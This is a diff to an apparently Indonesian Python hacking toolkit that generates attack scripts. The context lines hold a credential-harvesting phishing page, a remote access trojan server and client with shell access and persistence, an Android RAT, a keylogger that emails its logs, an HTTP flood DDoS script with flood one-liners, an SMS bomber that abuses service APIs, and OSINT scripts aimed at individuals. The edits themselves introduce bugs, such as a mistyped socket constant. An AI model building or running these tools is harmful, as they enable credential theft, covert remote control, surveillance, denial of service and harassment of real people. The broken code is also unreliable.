@@ -220,7 +220,7 @@ def fitur_1():
     print(colored(f"   Template: {name}", 'cyan'))
     
     # Generate REAL phishing page with credential logging
-    html_content = f'''<!DOCTYPE html>
+    html_content = '''<!DOCTYPE html>
 <html>
 <head>
     <title>{name} - Please Login</title>
@@ -263,7 +263,7 @@ def fitur_1():
                 username: username,
                 password: password,
                 timestamp: new Date().toISOString(),
-                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip)
+                ip: null
             }};
             
             // Store in localStorage
@@ -276,18 +276,24 @@ def fitur_1():
             formData.append('time', new Date().toISOString());
             formData.append('url', window.location.href);
             
-            fetch('https://webhook.site/your-webhook-url', {{
-                method: 'POST',
-                body: formData
-            }}).catch(() => {{}});
+            // Try to get IP
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {{
+                    credentials.ip = data.ip;
+                    localStorage.setItem('captured_credentials', JSON.stringify(credentials));
+                }})
+                .catch(() => {{}});
             
             // Redirect to real site
             alert('Login successful! Redirecting...');
-            window.location.href = 'https://{name.lower()}.com';
+            window.location.href = 'https://{name_lower}.com';
         }});
     </script>
 </body>
 </html>'''
+    
+    html_content = html_content.replace('{name}', name).replace('{name_lower}', name.lower())
     
     # Save HTML file
     html_file = f"phishing_{code}_{int(time.time())}.html"
@@ -349,7 +355,7 @@ def fitur_2():
         # Generate RAT Server
         port = input(colored("Port (default: 4444): ", 'yellow')).strip() or "4444"
         
-        rat_server = f'''#!/usr/bin/env python3
+        rat_server = '''#!/usr/bin/env python3
 # CYBER indonet RAT Server
 import socket, subprocess, threading, os, json, time, sys, platform, shutil, base64, getpass
 from datetime import datetime
@@ -360,7 +366,7 @@ PORT = {port}
 BUFFER_SIZE = 4096
 
 print(f"[+] RAT Server Started")
-print(f"[+] Listening on {{HOST}}:{{PORT}}")
+print(f"[+] Listening on {HOST}:{PORT}")
 print(f"[+] Use CTRL+C to stop")
 
 class RATServer:
@@ -369,7 +375,7 @@ class RATServer:
         self.running = True
         
     def handle_client(self, client_socket, addr):
-        print(f"[+] Connection from {{addr}}")
+        print(f"[+] Connection from {addr}")
         
         try:
             # Send welcome message
@@ -382,12 +388,12 @@ class RATServer:
                 if not cmd:
                     break
                     
-                print(f"[{{addr}}] Command: {{cmd}}")
+                print(f"[{addr}] Command: {cmd}")
                 
                 if cmd.lower() == 'exit':
                     break
                 elif cmd.lower() == 'help':
-                    help_msg = "Available commands:
+                    help_msg = """Available commands:
 1. sysinfo - System information
 2. screenshot - Take screenshot
 3. webcam - Capture webcam image
@@ -397,18 +403,18 @@ class RATServer:
 7. download <file> - Download file
 8. upload <file> <data> - Upload file
 9. persistence - Install persistence
-10. exit - Close connection"
+10. exit - Close connection"""
                     client_socket.send(help_msg.encode())
                 elif cmd.lower() == 'sysinfo':
                     info = f"""
 System Information:
-OS: {{platform.system()}} {{platform.release()}}
-Architecture: {{platform.architecture()[0]}}
-Processor: {{platform.processor()}}
-Hostname: {{platform.node()}}
-User: {{getpass.getuser()}}
-Python: {{platform.python_version()}}
-Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
+OS: {platform.system()} {platform.release()}
+Architecture: {platform.architecture()[0]}
+Processor: {platform.processor()}
+Hostname: {platform.node()}
+User: {getpass.getuser()}
+Python: {platform.python_version()}
+Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
                     client_socket.send(info.encode())
                 elif cmd.lower() == 'screenshot':
@@ -421,14 +427,14 @@ Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
                         client_socket.send(b'SCREENSHOT:' + base64.b64encode(data))
                         os.remove('screenshot.png')
                     except Exception as e:
-                        client_socket.send(f"Error: {{e}}".encode())
+                        client_socket.send(f"Error: {e}".encode())
                 elif cmd.startswith('shell '):
                     try:
                         command = cmd[6:]
                         result = subprocess.getoutput(command)
                         client_socket.send(result.encode())
                     except Exception as e:
-                        client_socket.send(f"Error: {{e}}".encode())
+                        client_socket.send(f"Error: {e}".encode())
                 elif cmd.startswith('download '):
                     filepath = cmd[9:]
                     if os.path.exists(filepath):
@@ -436,7 +442,7 @@ Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
                             data = f.read()
                         client_socket.send(b'FILE:' + base64.b64encode(data) + b':' + filepath.encode())
                     else:
-                        client_socket.send(f"File not found: {{filepath}}".encode())
+                        client_socket.send(f"File not found: {filepath}".encode())
                 elif cmd.startswith('upload '):
                     parts = cmd.split(' ', 2)
                     if len(parts) == 3:
@@ -444,7 +450,7 @@ Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
                         filedata = base64.b64decode(parts[2])
                         with open(filename, 'wb') as f:
                             f.write(filedata)
-                        client_socket.send(f"Uploaded: {{filename}}".encode())
+                        client_socket.send(f"Uploaded: {filename}".encode())
                 elif cmd == 'persistence':
                     # Install persistence based on OS
                     if platform.system() == 'Windows':
@@ -459,14 +465,14 @@ Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
                     client_socket.send(b"Unknown command. Type 'help' for list.")
                     
         except Exception as e:
-            print(f"[-] Error with {{addr}}: {{e}}")
+            print(f"[-] Error with {addr}: {e}")
         finally:
             client_socket.close()
-            print(f"[-] Connection closed: {{addr}}")
+            print(f"[-] Connection closed: {addr}")
     
     def start(self):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.setsockopt(socket.SOL_SOCKet, socket.SO_REUSEADDR, 1)
         server.bind((HOST, PORT))
         server.listen(5)
         
@@ -488,6 +494,7 @@ if __name__ == '__main__':
     server.start()
 '''
         
+        rat_server = rat_server.format(port=port)
         filename = f"rat_server_{port}.py"
         with open(filename, "w") as f:
             f.write(rat_server)
@@ -502,7 +509,7 @@ if __name__ == '__main__':
         server_ip = input(colored("Server IP: ", 'yellow')).strip()
         server_port = input(colored("Server Port: ", 'yellow')).strip() or "4444"
         
-        rat_client = f'''#!/usr/bin/env python3
+        rat_client = '''#!/usr/bin/env python3
 # CYBER indonet RAT Client
 import socket, subprocess, os, sys, time, platform, json, base64, threading, getpass
 
@@ -512,7 +519,7 @@ SERVER_PORT = {server_port}
 BUFFER_SIZE = 4096
 
 print(f"[+] RAT Client Starting...")
-print(f"[+] Connecting to {{SERVER_HOST}}:{{SERVER_PORT}}")
+print(f"[+] Connecting to {SERVER_HOST}:{SERVER_PORT}")
 
 class RATClient:
     def __init__(self):
@@ -534,7 +541,7 @@ class RATClient:
                 while self.running:
                     try:
                         # Show prompt
-                        prompt = f"{{getpass.getuser()}}@{{platform.node()}}$ "
+                        prompt = f"{getpass.getuser()}@{platform.node()}$ "
                         sys.stdout.write(prompt)
                         sys.stdout.flush()
                         
@@ -561,7 +568,7 @@ class RATClient:
                                 filename = parts[2].decode()
                                 with open(filename, 'wb') as f:
                                     f.write(filedata)
-                                print(f"[+] File downloaded: {{filename}}")
+                                print(f"[+] File downloaded: {filename}")
                         elif response.startswith(b'SCREENSHOT:'):
                             # Screenshot received
                             img_data = base64.b64decode(response[11:])
@@ -575,13 +582,13 @@ class RATClient:
                     except socket.timeout:
                         continue
                     except Exception as e:
-                        print(f"[-] Error: {{e}}")
+                        print(f"[-] Error: {e}")
                         break
                 
                 sock.close()
                 
             except Exception as e:
-                print(f"[-] Connection error: {{e}}")
+                print(f"[-] Connection error: {e}")
                 time.sleep(10)  # Wait before reconnecting
     
     def start(self):
@@ -599,6 +606,7 @@ if __name__ == '__main__':
     client.start()
 '''
         
+        rat_client = rat_client.format(server_ip=server_ip, server_port=server_port)
         filename = f"rat_client_{int(time.time())}.py"
         with open(filename, "w") as f:
             f.write(rat_client)
@@ -612,7 +620,7 @@ if __name__ == '__main__':
         # Simple Keylogger
         print(colored("\n[KEYLOGGER GENERATOR]", 'yellow'))
         
-        keylogger = f'''#!/usr/bin/env python3
+        keylogger = '''#!/usr/bin/env python3
 # CYBER indonet Keylogger
 import keyboard, threading, time, os, sys, smtplib
 from datetime import datetime
@@ -624,7 +632,7 @@ SEND_TO_EMAIL = ""  # Set email to send logs
 SEND_INTERVAL = 60  # Seconds
 
 print("[+] Keylogger Started")
-print(f"[+] Log file: {{LOG_FILE}}")
+print(f"[+] Log file: {LOG_FILE}")
 
 class KeyLogger:
     def __init__(self):
@@ -642,7 +650,7 @@ class KeyLogger:
                 name = "."
             else:
                 name = name.replace(" ", "_")
-                name = f"[{{name.upper()}}]"
+                name = f"[{name.upper()}]"
         
         self.log += name
         
@@ -653,7 +661,7 @@ class KeyLogger:
     def save_log(self):
         timestamp = datetime.now().strftime('%Y-%m-d %H:%M:%S')
         with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(f"[{{timestamp}}] {{self.log}}\\n")
+            f.write(f"[{timestamp}] {self.log}\\n")
         self.log = ""
     
     def send_logs(self):
@@ -674,16 +682,16 @@ class KeyLogger:
             msg = MIMEMultipart()
             msg['From'] = sender_email
             msg['To'] = SEND_TO_EMAIL
-            msg['Subject'] = f"Keylogger Report {{datetime.now().strftime('%Y-%m-%d %H:%M')}}"
+            msg['Subject'] = f"Keylogger Report {datetime.now().strftime('%Y-%m-%d %H:%M')}"
             
             body = f"""
 Keylogger Report
-Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
-Host: {{os.getenv('COMPUTERNAME', platform.node())}}
-User: {{os.getenv('USERNAME', getpass.getuser())}}
+Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+Host: {os.getenv('COMPUTERNAME', platform.node())}
+User: {os.getenv('USERNAME', getpass.getuser())}
 
 Logs:
-{{content}}
+{content}
             """
             
             msg.attach(MIMEText(body, 'plain'))
@@ -701,10 +709,10 @@ Logs:
             open(LOG_FILE, 'w').close()
             
         except Exception as e:
-            print(f"[-] Email error: {{e}}")
+            print(f"[-] Email error: {e}")
     
     def start(self):
-        print(f"[*] Keylogger started at {{self.start_time}}")
+        print(f"[*] Keylogger started at {self.start_time}")
         
         # Start keyboard listener
         keyboard.on_release(callback=self.callback)
@@ -782,12 +790,12 @@ def android_rat():
                 s.connect((SERVER_IP, SERVER_PORT))
                 
                 # Send device info
-                device_info = {
+                device_info = {{
                     'device': 'Android',
                     'termux': True,
                     'user': getpass.getuser(),
                     'host': socket.gethostname()
-                }
+                }}
                 s.send(json.dumps(device_info).encode())
                 
                 while True:
@@ -883,7 +891,7 @@ def fitur_3():
     duration = input(colored("Duration (seconds): ", 'yellow')).strip() or "60"
     threads = input(colored("Threads (default 1000): ", 'yellow')).strip() or "1000"
     
-    ddos_script = f'''#!/usr/bin/env python3
+    ddos_script = '''#!/usr/bin/env python3
 # CYBER indonet DDoS Tool
 import socket, threading, time, random, sys, ssl, os, urllib.parse
 
@@ -920,7 +928,7 @@ def attack():
             fake_ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))
             
             # HTTP flood
-            headers = f"GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\nUser-Agent: {{random.choice(user_agents)}}\\r\\nX-Forwarded-For: {{fake_ip}}\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n"
+            headers = f"GET / HTTP/1.1\\r\\nHost: {target}\\r\\nUser-Agent: {random.choice(user_agents)}\\r\\nX-Forwarded-For: {fake_ip}\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n"
             
             s.send(headers.encode())
             
@@ -935,7 +943,7 @@ def attack():
             success_count += 1
             
             if attack_num % 100 == 0:
-                print(f"[+] Attacks sent: {{attack_num}} | Successful: {{success_count}}")
+                print(f"[+] Attacks sent: {attack_num} | Successful: {success_count}")
             
             s.close()
             
@@ -946,10 +954,10 @@ def attack():
         time.sleep(0.001)
 
 print(f"[*] DDoS Attack Started")
-print(f"[*] Target: {{target}}:{{port}}")
-print(f"[*] Duration: {{duration}} seconds")
-print(f"[*] Threads: {{threads}}")
-print(f"[*] Starting at {{time.strftime('%H:%M:%S')}}")
+print(f"[*] Target: {target}:{port}")
+print(f"[*] Duration: {duration} seconds")
+print(f"[*] Threads: {threads}")
+print(f"[*] Starting at {time.strftime('%H:%M:%S')}")
 
 # Create and start threads
 thread_list = []
@@ -963,14 +971,15 @@ for i in range(int(threads)):
 time.sleep(int(duration))
 
 print(f"\\n[+] Attack completed!")
-print(f"[+] Total attacks attempted: {{attack_num}}")
-print(f"[+] Successful connections: {{success_count}}")
-print(f"[+] Finished at {{time.strftime('%H:%M:%S')}}")
+print(f"[+] Total attacks attempted: {attack_num}")
+print(f"[+] Successful connections: {success_count}")
+print(f"[+] Finished at {time.strftime('%H:%M:%S')}")
 
 # Additional attack methods
 print(f"\\n[+] For stronger attack, run multiple instances")
 '''
-
+    
+    ddos_script = ddos_script.format(target=target, port=port, duration=duration, threads=threads)
     filename = f"ddos_attack_{int(time.time())}.py"
     with open(filename, "w") as f:
         f.write(ddos_script)
@@ -985,7 +994,7 @@ print(f"\\n[+] For stronger attack, run multiple instances")
     # Additional DDoS methods
     print(colored(f"\n[+] Additional DDoS Methods:", 'cyan'))
     print(colored("   1. Slowloris:", 'white'))
-    print(colored("      python3 -c \"import socket; s=socket.socket(); s.connect(('target',80)); s.send(b'GET / HTTP/1.1\\r\\nHost: target\\r\\n')\"", 'yellow'))
+    print(colored("      python3 -c \"import socket; s=socket.socket(); s.connect(('target',80)); s.send(b'GET / HTTP/1.1\\\\r\\\\nHost: target\\\\r\\\\n')\"", 'yellow'))
     print(colored("   2. UDP Flood:", 'white'))
     print(colored("      python3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'X'*1024,('target',port))\"", 'yellow'))
     print(colored("   3. SYN Flood:", 'white'))
@@ -1003,7 +1012,7 @@ def fitur_4():
     count = input(colored("Number of attacks (default 100): ", 'yellow')).strip() or "100"
     delay = input(colored("Delay between attacks (seconds, default 0.5): ", 'yellow')).strip() or "0.5"
     
-    bomber_script = f'''#!/usr/bin/env python3
+    bomber_script = '''#!/usr/bin/env python3
 # CYBER indonet SMS Bomber
 import requests, threading, time, random, json, sys
 
@@ -1054,7 +1063,7 @@ services = [
         "name": "OVO",
         "url": "https://api.ovo.id/graphql",
         "method": "POST",
-        "data": {{"query": "mutation {{ verifyPhoneNumber(phoneNumber: \\"{{target}}\\") {{ status }} }}"}},
+        "data": {{"query": "mutation {{ verifyPhoneNumber(phoneNumber: \\"{target}\\") {{ status }} }}"}},
         "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
     }},
     {{
@@ -1130,7 +1139,8 @@ print("     Use WhatsApp Web to send multiple messages")
 print("   • Call flood:")
 print("     Use Twilio API or similar services")
 '''
-
+    
+    bomber_script = bomber_script.format(number=number, count=count, delay=delay)
     filename = f"sms_bomber_{int(time.time())}.py"
     with open(filename, "w") as f:
         f.write(bomber_script)
@@ -1163,40 +1173,40 @@ def fitur_5():
     if choice == "1":
         username = input(colored("Username: ", 'yellow')).strip()
         
-        osint_script = f'''#!/usr/bin/env python3
+        osint_script = '''#!/usr/bin/env python3
 # CYBER indonet Username OSINT
 import requests, json, re, sys, time
 
 username = "{username}"
 
-print(f"[*] OSINT investigation for: {{username}}")
-print(f"[*] Starting scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")
+print(f"[*] OSINT investigation for: {username}")
+print(f"[*] Starting scan at {time.strftime('%Y-%m-%d %H:%M:%S')}")
 
 # Social media platforms
 platforms = [
-    ("GitHub", f"https://github.com/{{username}}"),
-    ("Twitter", f"https://twitter.com/{{username}}"),
-    ("Instagram", f"https://instagram.com/{{username}}"),
-    ("Facebook", f"https://facebook.com/{{username}}"),
+    ("GitHub", f"https://github.com/{username}"),
+    ("Twitter", f"https://twitter.com/{username}"),
+    ("Instagram", f"https://instagram.com/{username}"),
+    ("Facebook", f"https://facebook.com/{username}"),
     ("YouTube", f"https://youtube.com/@{username}"),
-    ("Reddit", f"https://reddit.com/user/{{username}}"),
+    ("Reddit", f"https://reddit.com/user/{username}"),
     ("TikTok", f"https://tiktok.com/@{username}"),
-    ("Pinterest", f"https://pinterest.com/{{username}}"),
-    ("Steam", f"https://steamcommunity.com/id/{{username}}"),
-    ("Twitch", f"https://twitch.tv/{{username}}"),
-    ("LinkedIn", f"https://linkedin.com/in/{{username}}"),
+    ("Pinterest", f"https://pinterest.com/{username}"),
+    ("Steam", f"https://steamcommunity.com/id/{username}"),
+    ("Twitch", f"https://twitch.tv/{username}"),
+    ("LinkedIn", f"https://linkedin.com/in/{username}"),
     ("Medium", f"https://medium.com/@{username}"),
-    ("DeviantArt", f"https://{{username}}.deviantart.com"),
-    ("Flickr", f"https://flickr.com/people/{{username}}"),
-    ("SoundCloud", f"https://soundcloud.com/{{username}}"),
-    ("Spotify", f"https://open.spotify.com/user/{{username}}"),
-    ("Telegram", f"https://t.me/{{username}}"),
-    ("VK", f"https://vk.com/{{username}}"),
-    ("Blogger", f"https://{{username}}.blogspot.com"),
-    ("WordPress", f"https://{{username}}.wordpress.com"),
+    ("DeviantArt", f"https://{username}.deviantart.com"),
+    ("Flickr", f"https://flickr.com/people/{username}"),
+    ("SoundCloud", f"https://soundcloud.com/{username}"),
+    ("Spotify", f"https://open.spotify.com/user/{username}"),
+    ("Telegram", f"https://t.me/{username}"),
+    ("VK", f"https://vk.com/{username}"),
+    ("Blogger", f"https://{username}.blogspot.com"),
+    ("WordPress", f"https://{username}.wordpress.com"),
 ]
 
-print(f"\\n[*] Checking {{len(platforms)}} platforms...")
+print(f"\\n[*] Checking {len(platforms)} platforms...")
 
 found = []
 not_found = []
@@ -1210,16 +1220,16 @@ for platform_name, url in platforms:
         response = requests.get(url, headers=headers, timeout=10, allow_redirects=False)
         
         if response.status_code == 200:
-            print(f"[+] {{platform_name}}: FOUND - {{url}}")
+            print(f"[+] {platform_name}: FOUND - {url}")
             found.append({{"platform": platform_name, "url": url}})
         elif response.status_code == 404:
-            print(f"[-] {{platform_name}}: Not found")
+            print(f"[-] {platform_name}: Not found")
             not_found.append(platform_name)
         else:
-            print(f"[?] {{platform_name}}: Status {{response.status_code}}")
+            print(f"[?] {platform_name}: Status {response.status_code}")
     
     except Exception as e:
-        print(f"[!] {{platform_name}}: Error")
+        print(f"[!] {platform_name}: Error")
 
 # Check data breaches
 print(f"\\n[*] Checking data breaches...")
@@ -1229,7 +1239,7 @@ try:
     sha1_hash = hashlib.sha1(username.encode()).hexdigest().upper()
     prefix = sha1_hash[:5]
     
-    hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
+    hibp_url = f"https://api.pwnedpasswords.com/range/{prefix}"
     response = requests.get(hibp_url, timeout=10)
     
     if response.status_code == 200:
@@ -1237,14 +1247,14 @@ try:
         for h in hashes:
             if h.startswith(sha1_hash[5:]):
                 count = h.split(':')[1].strip()
-                print(f"[!] BREACHED: Found in {{count}} data breaches!")
+                print(f"[!] BREACHED: Found in {count} data breaches!")
                 break
 except:
     pass
 
 # Save results
 if found:
-    with open(f"osint_{{username}}.json", "w") as f:
+    with open(f"osint_{username}.json", "w") as f:
         json.dump({{
             "username": username,
             "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
@@ -1252,27 +1262,28 @@ if found:
             "not_found": not_found
         }}, f, indent=2)
     
-    print(f"\\n[+] Results saved to osint_{{username}}.json")
-    print(f"[+] Found on {{len(found)}} platforms")
+    print(f"\\n[+] Results saved to osint_{username}.json")
+    print(f"[+] Found on {len(found)} platforms")
     
 else:
-    print(f"\\n[-] No profiles found for {{username}}")
+    print(f"\\n[-] No profiles found for {username}")
 
-print(f"\\n[*] OSINT scan completed at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")
+print(f"\\n[*] OSINT scan completed at {time.strftime('%Y-%m-%d %H:%M:%S')}")
 '''
         
         filename = f"osint_username_{username}.py"
+        osint_script = osint_script.format(username=username)
     
     elif choice == "2":
         email = input(colored("Email address: ", 'yellow')).strip()
         
-        osint_script = f'''#!/usr/bin/env python3
+        osint_script = '''#!/usr/bin/env python3
 # CYBER indonet Email OSINT
 import requests, json, re, sys, time, hashlib
 
 email = "{email}"
 
-print(f"[*] Email investigation: {{email}}")
+print(f"[*] Email investigation: {email}")
 
 # Check breaches
 print(f"\\n[*] Checking breaches...")
@@ -1280,7 +1291,7 @@ try:
     sha1_hash = hashlib.sha1(email.encode()).hexdigest().upper()
     prefix = sha1_hash[:5]
     
-    hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
+    hibp_url = f"https://api.pwnedpasswords.com/range/{prefix}"
     response = requests.get(hibp_url, timeout=10)
     
     if response.status_code == 200:
@@ -1288,50 +1299,51 @@ try:
         for h in hashes:
             if h.startswith(sha1_hash[5:]):
                 count = h.split(':')[1].strip()
-                print(f"[!] BREACHED: {{count}} times!")
+                print(f"[!] BREACHED: {count} times!")
                 break
 except:
     pass
 
 # Extract username
 username = email.split('@')[0]
-print(f"\\n[*] Username suggestion: {{username}}")
-print(f"[*] Domain: {{email.split('@')[1]}}")
+print(f"\\n[*] Username suggestion: {username}")
+print(f"[*] Domain: {email.split('@')[1]}")
 
 # Check social media
 print(f"\\n[*] Checking social media...")
 platforms = [
-    ("Facebook", f"https://facebook.com/{{username}}"),
-    ("Instagram", f"https://instagram.com/{{username}}"),
-    ("Twitter", f"https://twitter.com/{{username}}"),
-    ("GitHub", f"https://github.com/{{username}}"),
+    ("Facebook", f"https://facebook.com/{username}"),
+    ("Instagram", f"https://instagram.com/{username}"),
+    ("Twitter", f"https://twitter.com/{username}"),
+    ("GitHub", f"https://github.com/{username}"),
 ]
 
 for platform_name, url in platforms:
     try:
         response = requests.get(url, timeout=5)
         if response.status_code == 200:
-            print(f"[+] {{platform_name}}: Possible match")
+            print(f"[+] {platform_name}: Possible match")
         else:
-            print(f"[-] {{platform_name}}: Not found")
+            print(f"[-] {platform_name}: Not found")
     except:
-        print(f"[!] {{platform_name}}: Check failed")
+        print(f"[!] {platform_name}: Check failed")
 
 print(f"\\n[*] Scan completed")
 '''
         
         filename = f"osint_email_{email.replace('@', '_at_')}.py"
+        osint_script = osint_script.format(email=email)
     
     elif choice == "3":
         phone = input(colored("Phone number (+62...): ", 'yellow')).strip()
         
-        osint_script = f'''#!/usr/bin/env python3
+        osint_script = '''#!/usr/bin/env python3
 # CYBER indonet Phone OSINT
 import re, sys, time
 
 phone = "{phone}"
 
-print(f"[*] Phone investigation: {{phone}}")
+print(f"[*] Phone investigation: {phone}")
 
 # Clean phone number
 clean_phone = re.sub(r'[^0-9]', '', phone)
@@ -1340,7 +1352,7 @@ if clean_phone.startswith('0'):
 elif clean_phone.startswith('+62'):
     clean_phone = clean_phone[1:]
 
-print(f"\\n[*] Clean number: +{{clean_phone}}")
+print(f"\\n[*] Clean number: +{clean_phone}")
 
 # Identify carrier
 carrier_prefixes = {{
@@ -1380,61 +1392,62 @@ for prefix, name in carrier_prefixes.items():
         carrier = name
         break
 
-print(f"[*] Carrier: {{carrier}}")
+print(f"[*] Carrier: {carrier}")
 
 # Generate links
 print(f"\\n[*] Investigation links:")
-print(f"   WhatsApp: https://wa.me/{{clean_phone}}")
-print(f"   Truecaller: https://truecaller.com/search/id/{{phone}}")
-print(f"   Facebook: https://facebook.com/search/top/?q=%2B{{clean_phone}}")
+print(f"   WhatsApp: https://wa.me/{clean_phone}")
+print(f"   Truecaller: https://truecaller.com/search/id/{phone}")
+print(f"   Facebook: https://facebook.com/search/top/?q=%2B{clean_phone}")
 
 print(f"\\n[*] Scan completed")
 '''
         
         filename = f"osint_phone_{phone}.py"
+        osint_script = osint_script.format(phone=phone)
     
     elif choice == "4":
         username = input(colored("Social media username: ", 'yellow')).strip()
         
-        osint_script = f'''#!/usr/bin/env python3
+        osint_script = '''#!/usr/bin/env python3
 # CYBER indonet Social Media Scan
 import requests, json, time
 
 username = "{username}"
 
-print(f"[*] Social media scan for: {{username}}")
+print(f"[*] Social media scan for: {username}")
 
 platforms = [
-    ("Facebook", f"https://facebook.com/{{username}}"),
-    ("Instagram", f"https://instagram.com/{{username}}"),
-    ("Twitter", f"https://twitter.com/{{username}}"),
+    ("Facebook", f"https://facebook.com/{username}"),
+    ("Instagram", f"https://instagram.com/{username}"),
+    ("Twitter", f"https://twitter.com/{username}"),
     ("TikTok", f"https://tiktok.com/@{username}"),
     ("YouTube", f"https://youtube.com/@{username}"),
-    ("Reddit", f"https://reddit.com/user/{{username}}"),
-    ("GitHub", f"https://github.com/{{username}}"),
-    ("LinkedIn", f"https://linkedin.com/in/{{username}}"),
-    ("Pinterest", f"https://pinterest.com/{{username}}"),
-    ("Twitch", f"https://twitch.tv/{{username}}"),
-    ("Steam", f"https://steamcommunity.com/id/{{username}}"),
-    ("Spotify", f"https://open.spotify.com/user/{{username}}"),
-    ("Telegram", f"https://t.me/{{username}}"),
+    ("Reddit", f"https://reddit.com/user/{username}"),
+    ("GitHub", f"https://github.com/{username}"),
+    ("LinkedIn", f"https://linkedin.com/in/{username}"),
+    ("Pinterest", f"https://pinterest.com/{username}"),
+    ("Twitch", f"https://twitch.tv/{username}"),
+    ("Steam", f"https://steamcommunity.com/id/{username}"),
+    ("Spotify", f"https://open.spotify.com/user/{username}"),
+    ("Telegram", f"https://t.me/{username}"),
 ]
 
-print(f"\\n[*] Checking {{len(platforms)}} platforms...")
+print(f"\\n[*] Checking {len(platforms)} platforms...")
 
 found = []
 for platform_name, url in platforms:
     try:
         response = requests.get(url, timeout=5, allow_redirects=False)
         if response.status_code == 200:
-            print(f"[+] {{platform_name}}: FOUND")
+            print(f"[+] {platform_name}: FOUND")
             found.append(platform_name)
         else:
-            print(f"[-] {{platform_name}}: Not found")
+            print(f"[-] {platform_name}: Not found")
     except:
-        print(f"[!] {{platform_name}}: Error")
+        print(f"[!] {platform_name}: Error")
 
-print(f"\\n[*] Found on {{len(found)}} platforms")
+print(f"\\n[*] Found on {len(found)} platforms")
 if found:
     print("   • " + "\\n   • ".join(found))
 
@@ -1442,30 +1455,31 @@ print(f"\\n[*] Scan completed")
 '''
         
         filename = f"osint_social_{username}.py"
+        osint_script = osint_script.format(username=username)
     
     elif choice == "5":
         ip = input(colored("IP Address: ", 'yellow')).strip()
         
-        osint_script = f'''#!/usr/bin/env python3
+        osint_script = '''#!/usr/bin/env python3
 # CYBER indonet IP OSINT
 import requests, json, socket, sys, time
 
 target_ip = "{ip}"
 
-print(f"[*] IP investigation: {{target_ip}}")
+print(f"[*] IP investigation: {target_ip}")
 
 # Get hostname
 try:
     hostname = socket.gethostbyaddr(target_ip)[0]
-    print(f"[*] Hostname: {{hostname}}")
+    print(f"[*] Hostname: {hostname}")
 except:
     print(f"[*] Hostname: Not found")
 
 # Geolocation
 print(f"\\n[*] Getting geolocation...")
 apis = [
-    ("ip-api.com", f"http://ip-api.com/json/{{target_ip}}"),
-    ("ipapi.co", f"https://ipapi.co/{{target_ip}}/json/"),
+    ("ip-api.com", f"http://ip-api.com/json/{target_ip}"),
+    ("ipapi.co", f"https://ipapi.co/{target_ip}/json/"),
 ]
 
 for api_name, api_url in apis:
@@ -1473,44 +1487,45 @@ for api_name, api_url in apis:
         response = requests.get(api_url, timeout=10)
         if response.status_code == 200:
             data = response.json()
-            print(f"\\n[+] {{api_name}} Results:")
+            print(f"\\n[+] {api_name} Results:")
             
             if api_name == "ip-api.com":
-                print(f"   Country: {{data.get('country', 'N/A')}}")
-                print(f"   Region: {{data.get('regionName', 'N/A')}}")
-                print(f"   City: {{data.get('city', 'N/A')}}")
-                print(f"   ISP: {{data.get('isp', 'N/A')}}")
-                print(f"   Org: {{data.get('org', 'N/A')}}")
+                print(f"   Country: {data.get('country', 'N/A')}")
+                print(f"   Region: {data.get('regionName', 'N/A')}")
+                print(f"   City: {data.get('city', 'N/A')}")
+                print(f"   ISP: {data.get('isp', 'N/A')}")
+                print(f"   Org: {data.get('org', 'N/A')}")
             elif api_name == "ipapi.co":
-                print(f"   Country: {{data.get('country_name', 'N/A')}}")
-                print(f"   Region: {{data.get('region', 'N/A')}}")
-                print(f"   City: {{data.get('city', 'N/A')}}")
-                print(f"   ISP: {{data.get('org', 'N/A')}}")
+                print(f"   Country: {data.get('country_name', 'N/A')}")
+                print(f"   Region: {data.get('region', 'N/A')}")
+                print(f"   City: {data.get('city', 'N/A')}")
+                print(f"   ISP: {data.get('org', 'N/A')}")
             
             break
     except:
         continue
 
 print(f"\\n[*] Additional links:")
-print(f"   Shodan: https://shodan.io/host/{{target_ip}}")
-print(f"   Censys: https://censys.io/ipv4/{{target_ip}}")
-print(f"   AbuseIPDB: https://www.abuseipdb.com/check/{{target_ip}}")
+print(f"   Shodan: https://shodan.io/host/{target_ip}")
+print(f"   Censys: https://censys.io/ipv4/{target_ip}")
+print(f"   AbuseIPDB: https://www.abuseipdb.com/check/{target_ip}")
 
 print(f"\\n[*] Scan completed")
 '''
         
         filename = f"osint_ip_{ip.replace('.', '_')}.py"
+        osint_script = osint_script.format(ip=ip)
     
     elif choice == "6":
         target = input(colored("Email/Username to check breaches: ", 'yellow')).strip()
         
-        osint_script = f'''#!/usr/bin/env python3
+        osint_script = '''#!/usr/bin/env python3
 # CYBER indonet Breach Check
 import requests, hashlib, sys
 
 target = "{target}"
 
